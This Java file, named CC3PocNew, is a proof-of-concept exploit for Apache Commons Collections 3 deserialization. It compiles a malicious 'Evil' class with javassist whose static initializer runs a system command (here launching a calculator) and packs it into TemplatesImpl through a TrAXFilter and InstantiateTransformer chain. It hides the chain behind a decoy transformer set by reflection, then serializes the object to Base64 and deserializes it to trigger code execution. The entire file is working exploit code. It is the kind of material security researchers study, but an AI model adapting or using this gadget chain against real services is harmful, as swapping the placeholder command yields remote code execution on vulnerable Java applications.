package org.lcdm123;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3PocNew {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        byte[] bytes = getPayload();
        TemplatesImpl templates = new TemplatesImpl();
        setFiledValue(templates, "_bytecodes", new byte[][]{bytes});
        setFiledValue(templates, "_name", "lcdm123");

        Transformer[] faketransformer = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(faketransformer);
        HashMap inerMap = new HashMap();
        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);

        HashMap hashMap = new HashMap();
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "lcdm123");
        hashMap.put(tiedMapEntry, "lcdm");
        outerMap.remove("lcdm123");
        setFiledValue(chainedTransformer, "iTransformers", transformers);
        String result = serialize(hashMap);
        unserialize(result);

    }
    public static byte[] getPayload() throws CannotCompileException, NotFoundException, IOException {
        ClassPool pool = ClassPool.getDefault();
        CtClass clas = pool.makeClass("Evil");
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        String cmd = "Runtime.getRuntime().exec(\"gnome-calculator\");";
        clas.makeClassInitializer().insertBefore(cmd);
        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));
        clas.writeFile();
        byte[] payload = clas.toBytecode();
        return payload;
    }
    public static void setFiledValue(Object obj, String filedName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field field = clazz.getDeclaredField(filedName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        String result = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        return result;
    }
    public static void unserialize(String code) throws IOException, ClassNotFoundException {
        byte[] bytes = Base64.getDecoder().decode(code);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
        objectInputStream.close();
    }
}
